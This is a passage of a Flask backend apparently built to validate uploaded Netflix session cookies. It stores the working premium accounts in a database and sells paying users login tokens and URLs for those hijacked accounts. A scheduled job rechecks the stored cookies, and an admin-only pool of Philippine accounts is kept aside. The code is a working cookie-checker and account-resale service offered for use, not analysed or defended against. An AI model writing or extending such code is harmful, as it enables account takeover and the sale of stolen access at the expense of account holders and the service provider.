        is_premium_user = check_premium_status(user.id)
        is_admin = is_super_admin(user.id)
        
        # Store account - check if it should be exclusive (PH premium accounts auto-exclusive)
        is_ph_premium = (account_info["country"] == "PH" and 
                        account_info["premium"] and 
                        "Premium" in account_info.get("plan", ""))
        
        account_db_id = None
        if account_info["ok"] and account_info["premium"]:
            # Only super admins can create exclusive accounts
            can_be_exclusive = is_admin and is_ph_premium
            
            success, db_record = store_netflix_account(
                email=account_info["email"],
                netflix_id=netflix_id,
                subscription_type=account_info["subscription_type"],
                country=account_info["country"],
                plan=account_info["plan"],
                cookie_content=content,
                user_id=user.id,
                signup_country=account_info.get("signup_country"),
                detection_method=account_info.get("detection_method"),
                is_exclusive=can_be_exclusive,
                reserved_for_admin=can_be_exclusive
            )
            if success and db_record:
                account_db_id = db_record.get('id')
        
        if mode == 'generate_token' and not is_premium_user:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to generate tokens"
            }), 403
        
        # Rest of your existing code...
        if mode == 'check_only':
            if account_db_id:
                log_token_generation(
                    account_id=account_db_id,
                    user_id=user.id,
                    ip_address=request.remote_addr,
                    token=None
                )
            
            return jsonify({
                "status": "success",
                "data": {
                    "email": account_info["email"],
                    "country": account_info["country"],
                    "plan": account_info["plan"],
                    "is_premium": account_info["premium"],
                    "subscription_type": account_info["subscription_type"],
                    "mode": "check_only",
                    "stored_in_db": account_info["ok"] and account_info["premium"],
                    "is_exclusive": is_ph_premium and not is_admin  # Flag if user can't access it later
                }
            })
        
        token_result = generate_token(netflix_id)
        
        if token_result["status"] != "Success":
            return jsonify({
                "status": "error",
                "message": "Failed to generate token"
            })
        
        if account_db_id:
            log_token_generation(
                account_id=account_db_id,
                user_id=user.id,
                ip_address=request.remote_addr,
                token=token_result["token"]
            )
        
        return jsonify({
            "status": "success",
            "data": {
                "email": account_info["email"],
                "country": account_info["country"],
                "plan": account_info["plan"],
                "is_premium": account_info["premium"],
                "subscription_type": account_info["subscription_type"],
                "token": token_result["token"],
                "expires": token_result["expires"],
                "login_urls": token_result["login_urls"],
                "mode": "generate_token"
            }
        })
            
    except Exception as e:
        logger.error(f"Error in check_cookie: {str(e)}")
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/batch-check', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def batch_check(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    temp_dirs = []
    
    try:
        files = request.files.getlist('files')
        mode = request.form.get('mode', 'check_only')
        
        if not files:
            return jsonify({'status': 'error', 'message': 'No files provided'}), 400
        
        is_premium_user = check_premium_status(user.id)
        
        if mode == 'generate_token' and not is_premium_user:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to generate tokens"
            }), 403
        
        results = []
        total_files = len(files)
        
        def generate_progress():
            nonlocal results
            
            for index, file in enumerate(files, 1):
                filename = file.filename
                progress_data = {
                    'type': 'progress',
                    'current': index,
                    'total': total_files,
                    'filename': filename,
                    'percent': int((index / total_files) * 100)
                }
                yield f"data: {json.dumps(progress_data)}\n\n"
                
                result = process_single_file(file, mode, is_premium_user, user.id)
                results.append(result)
                
                result_data = {
                    'type': 'result',
                    'result': result,
                    'current': index,
                    'total': total_files
                }
                yield f"data: {json.dumps(result_data)}\n\n"
            
            completion_data = {
                'type': 'complete',
                'results': results,
                'summary': {
                    'total': len(results),
                    'valid': len([r for r in results if r['status'] == 'success']),
                    'invalid': len([r for r in results if r['status'] == 'error'])
                }
            }
            yield f"data: {json.dumps(completion_data)}\n\n"
        
        if request.headers.get('Accept') == 'application/json':
            for            file in files:
                result = process_single_file(file, mode, is_premium_user, user.id)
                results.append(result)
            
            return jsonify({
                "status": "success",
                "results": results
            })
        
        return Response(
            stream_with_context(generate_progress()),
            mimetype='text/event-stream',
            headers={
                'Cache-Control': 'no-cache',
                'X-Accel-Buffering': 'no'
            }
        )
        
    except Exception as e:
        logger.error(f"Batch check error: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)}), 500
    
    finally:
        for temp_dir in temp_dirs:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass

def process_single_file(file, mode, is_premium_user, user_id):
    filename = file.filename
    
    try:
        if filename.lower().endswith('.zip'):
            unique_dir = tempfile.mkdtemp(prefix=f"batch_", dir=TEMP_DIR)
            zip_path = os.path.join(unique_dir, filename)
            file.save(zip_path)
            txt_files = extract_zip_and_get_files(zip_path, unique_dir)
            
            if txt_files:
                with open(txt_files[0], 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                return process_content(content, os.path.basename(txt_files[0]), mode, is_premium_user, user_id)
            else:
                return {
                    "status": "error", 
                    "filename": filename, 
                    "message": "No text files found in ZIP"
                }
        
        elif filename.lower().endswith('.txt'):
            content = file.read().decode('utf-8', errors='ignore')
            return process_content(content, filename, mode, is_premium_user, user_id)
        
        else:
            return {
                "status": "error", 
                "filename": filename, 
                "message": "Unsupported file type"
            }
            
    except Exception as e:
        return {
            "status": "error", 
            "filename": filename, 
            "message": str(e)
        }

def process_content(content, filename, mode, is_premium_user, user_id):
    netflix_id = extract_netflix_id(content)
    
    if not netflix_id:
        return {
            "status": "error", 
            "filename": filename, 
            "message": "No NetflixId found"
        }
    
    account_info = check_netflix_cookie({"NetflixId": netflix_id})
    
    if not account_info["ok"]:
        return {
            "status": "error", 
            "filename": filename, 
            "message": account_info.get('err', 'Invalid account')
        }
    
    if account_info["ok"] and account_info["premium"]:
        store_netflix_account(
            email=account_info["email"],
            netflix_id=netflix_id,
            subscription_type=account_info["subscription_type"],
            country=account_info["country"],
            plan=account_info["plan"],
            cookie_content=content,
            user_id=user_id
        )
    
    result_data = {
        "status": "success",
        "filename": filename,
        "email": account_info["email"],
        "country": account_info["country"],
        "plan": account_info["plan"],
        "is_premium": account_info["premium"],
        "subscription_type": account_info["subscription_type"],
        "mode": mode,
        "stored_in_db": account_info["ok"] and account_info["premium"]
    }
    
    if mode == 'generate_token' and is_premium_user:
        token_result = generate_token(netflix_id)
        if token_result["status"] == "Success":
            result_data["token"] = token_result["token"]
            result_data["expires"] = token_result["expires"]
            result_data["login_urls"] = token_result["login_urls"]
        else:
            result_data["token_error"] = token_result.get("error", "Failed")
    
    return result_data

@app.route('/api/accounts', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def get_accounts(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        is_premium = check_premium_status(user.id)
        is_admin = is_super_admin(user.id)
        
        logger.info(f"User {user.id} accessing accounts. Premium: {is_premium}, Admin: {is_admin}")
        
        if not is_premium and not is_admin:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to view accounts"
            }), 403
        
        # Build query based on permissions
        if is_admin:
            # Super admin sees everything including exclusive accounts
            query = supabase.table('netflix_accounts').select('*')
        else:
            # Regular premium users - exclude exclusive/super-admin-only accounts
            query = supabase.table('netflix_accounts')\
                .select('*')\
                .eq('is_active', True)\
                .eq('is_premium', True)\
                .or_('exclusive_access.eq.false,reserved_for_super_admin.eq.false')
        
        # Add filters from query params
        country_filter = request.args.get('country')
        if country_filter and not is_admin:
            query = query.eq('country', country_filter)
        
        query = query.order('created_at', desc=True)
        accounts = query.execute()
        
        # Log PH accounts count for monitoring
        if is_admin:
            ph_count = ensure_ph_accounts_pool()
            logger.info(f"Super admin {user.id} accessed accounts. PH pool: {ph_count}")
        
        # Format response
        safe_accounts = []
        for acc in accounts.data or []:
            account_data = {
                'id': acc['id'],
                'email': acc['email'],
                'subscription_type': acc['subscription_type'],
                'country': acc['country'],
                'plan': acc['plan'],
                'created_at': acc['created_at'],
                'last_checked': acc['last_checked'],
                'is_exclusive': acc.get('exclusive_access', False),
                'reserved_for_super_admin': acc.get('reserved_for_super_admin', False)
            }
            
            # Only show exclusive flags to super admin
            if not is_admin:
                account_data.pop('is_exclusive', None)
                account_data.pop('reserved_for_super_admin', None)
            
            safe_accounts.append(account_data)
        
        return jsonify({
            "status": "success",
            "accounts": safe_accounts,
            "is_super_admin": is_admin,
            "total_count": len(safe_accounts)
        })
        
    except Exception as e:
        logger.error(f"Error getting accounts: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/accounts/exclusive', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def get_exclusive_accounts(user):
    """Get accounts reserved for super admin only"""
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        accounts = supabase.table('netflix_accounts')\
            .select('*')\
            .or_('exclusive_access.eq.true,reserved_for_super_admin.eq.true')\
            .eq('is_active', True)\
            .order('created_at', desc=True)\
            .execute()
        
        # Ensure PH accounts minimum
        ph_accounts = [a for a in (accounts.data or []) if a.get('country') == 'PH']
        other_accounts = [a for a in (accounts.data or []) if a.get('country') != 'PH']
        
        return jsonify({
            "status": "success",
            "ph_accounts": {
                "count": len(ph_accounts),
                "accounts": ph_accounts[:20]  # Limit for performance
            },
            "other_exclusive": other_accounts[:20],
            "ph_minimum_met": len(ph_accounts) >= 8,
            "is_super_admin": True
        })
        
    except Exception as e:
        logger.error(f"Error getting exclusive accounts: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/accounts/<account_id>/set-exclusive', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def set_account_exclusive(user, account_id):
    """Mark an account as exclusive/super-admin-only"""
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        data = request.get_json()
        is_exclusive = data.get('exclusive_access', False)
        reserved_for_admin = data.get('reserved_for_super_admin', False)
        
        result = supabase.table('netflix_accounts')\
            .update({
                'exclusive_access': is_exclusive,
                'reserved_for_super_admin': reserved_for_admin,
                'updated_at': datetime.utcnow().isoformat()
            })\
            .eq('id', account_id)\
            .execute()
        
        if result.data:
            return jsonify({
                "status": "success",
                "message": "Account exclusivity updated",
                "account": result.data[0]
            })
        else:
            return jsonify({"status": "error", "message": "Account not found"}), 404
            
    except Exception as e:
        logger.error(f"Error setting exclusivity: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
@app.route('/api/accounts/<account_id>/generate-token', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def generate_account_token(user, account_id):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        is_premium = check_premium_status(user.id)
        
        if not is_premium:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required"
            }), 403
        
        account = supabase.table('netflix_accounts')\
            .select('*')\
            .eq('id', account_id)\
            .eq('is_active', True)\
            .single()\
            .execute()
        
        if not account.data:
            return jsonify({
                "status": "error",
                "message": "Account not found"
            }), 404
        
        netflix_id = account.data.get('netflix_id')
        
        if not netflix_id:
            return jsonify({
                "status": "error",
                "message": "Invalid account data"
            })
        
        token_result = generate_token(netflix_id)
        
        if token_result["status"] != "Success":
            return jsonify({
                "status": "error",
                "message": "Failed to generate token"
            })
        
        log_token_generation(
            account_id=account_id,
            user_id=user.id,
            ip_address=request.remote_addr
        )
        
        return jsonify({
            "status": "success",
            "data": {
                "email": account.data['email'],
                "subscription_type": account.data['subscription_type'],
                "token": token_result["token"],
                "expires": token_result["expires"],
                "login_urls": token_result["login_urls"]
            }
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        "status": "ok",
        "env_vars_set": {
            "SUPABASE_URL": bool(os.environ.get('SUPABASE_URL')),
            "SUPABASE_SERVICE_KEY": bool(os.environ.get('SUPABASE_SERVICE_KEY')),
            "FLASK_SECRET_KEY": bool(os.environ.get('FLASK_SECRET_KEY'))
        }
    })

@app.route('/api/cron/validate-accounts', methods=['GET', 'POST'])
def cron_validate_accounts():
    # Security check - verify cron secret or Vercel signature
    cron_secret = os.environ.get('CRON_SECRET')
    auth_header = request.headers.get('Authorization', '')
    
    is_vercel = (
        request.headers.get('User-Agent') == 'Vercel Cron' or
        (cron_secret and auth_header == f"Bearer {cron_secret}") or
        request.headers.get('x-vercel-signature') is not None  # Vercel internal
    )
    
    if not is_vercel and os.environ.get('VERCEL_ENV') == 'production':
        return jsonify({'status': 'unauthorized'}), 401
    
    try:
        # Get all active premium accounts
        accounts = supabase.table('netflix_accounts')\
            .select('*')\
            .eq('is_active', True)\
            .execute()
        
        if not accounts.data:
            return jsonify({'status': 'success', 'message': 'No accounts to check', 'checked': 0})
        
        results = {'valid': 0, 'invalid': 0, 'updated': 0, 'errors': []}
        
        for account in accounts.data:
            try:
                # Check if cookie is still valid
                netflix_id = account.get('netflix_id')
                cookie_data = account.get('cookie_data', '')
                
                if not netflix_id:
                    continue
                
                # Reconstruct minimal cookie dict for checking
                account_info = check_netflix_cookie({"NetflixId": netflix_id})
                
                if account_info['ok']:
                    # Still valid - update last_checked and refresh data
                    update_data = {
                        'last_checked': datetime.utcnow().isoformat(),
                        'plan': account_info['plan'],
                        'subscription_type': account_info['subscription_type'],
                        'country': account_info['country'],
                        'is_active': True,
                        'is_premium': account_info['premium']
                    }
                    
                    supabase.table('netflix_accounts')\
                        .update(update_data)\
                        .eq('id', account['id'])\
                        .execute()
                    
                    results['valid'] += 1
                    results['updated'] += 1
                    
                else:
                    # Cookie dead - mark as inactive
                    supabase.table('netflix_accounts')\
                        .update({
                            'is_active': False,
                            'last_checked': datetime.utcnow().isoformat(),
                            'deactivated_reason': account_info.get('err', 'Invalid cookie'),
                            'deactivated_at': datetime.utcnow().isoformat()
                        })\
                        .eq('id', account['id'])\
                        .execute()
                    
                    results['invalid'] += 1
                    
                # Small delay to avoid rate limiting
                time.sleep(1)
                
            except Exception as e:
                results['errors'].append({'account_id': account['id'], 'error': str(e)})
                logger.error(f"Error checking account {account['id']}: {e}")
                continue
        
        return jsonify({
            'status': 'success',
            'checked': len(accounts.data),
            'results': results
        })
        
    except Exception as e:
        logger.error(f"Cron job failed: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def is_super_admin(user_id):
    """Check if user is super admin"""
    if not user_id:
        return False
    
    # Check environment variable list first
    if str(user_id) in SUPER_ADMIN_IDS:
        logger.info(f"User {user_id} is super admin (env var)")
        return True
    
    try:
        result = supabase.table('user_profiles')\
            .select('is_super_admin, role')\
            .eq('id', str(user_id))\
            .single()\
            .execute()
        
        if result.data:
            is_admin = result.data.get('is_super_admin', False) or result.data.get('role') == 'super_admin'
            logger.info(f"User {user_id} super admin check (DB): {is_admin}")
            return is_admin
        return False
    except Exception as e:
        logger.error(f"Error checking super admin: {e}")
        return False

def require_super_admin(f):
    """Decorator to require super admin access"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'status': 'error', 'message': 'Authentication required'}), 401
        
        token = auth_header.split(' ')[1]
        try:
            user = supabase.auth.get_user(token)
            if not user or not is_super_admin(user.user.id):
                return jsonify({'status': 'error', 'message': 'Super admin access required'}), 403
            return f(user.user, *args, **kwargs)
        except Exception as e:
            logger.error(f"Super admin check error: {e}")
            return jsonify({'status': 'error', 'message': 'Invalid token'}), 401
    
    return decorated_function

def get_accounts_query(user_id, is_premium=False, is_admin=False):
    """Build query based on user permissions"""
    if is_admin:
        # Super admin sees everything including exclusive accounts
        return supabase.table('netflix_accounts').select('*')
    
    # Regular premium users - exclude exclusive/super-admin-only accounts
    return supabase.table('netflix_accounts')\
        .select('*')\
        .eq('is_active', True)\
        .eq('is_premium', True)\
        .or_('exclusive_access.eq.false,reserved_for_super_admin.eq.false')
def ensure_ph_accounts_pool():
    """Ensure at least 8 PH premium accounts exist for super admin"""
    try:
        # Check current PH accounts count
        result = supabase.table('netflix_accounts')\
            .select('*', count='exact')\
            .eq('country', 'PH')\
            .eq('is_premium', True)\
            .eq('is_active', True)\
            .execute()
        
        current_count = result.count if hasattr(result, 'count') else len(result.data or [])
        
        if current_count < 8:
            logger.warning(f"PH accounts pool low: {current_count}/8. Super admin should add more.")
            # You could trigger notifications here
        
        return current_count
    except Exception as e:
        logger.error(f"Error checking PH accounts pool: {e}")
        return 0
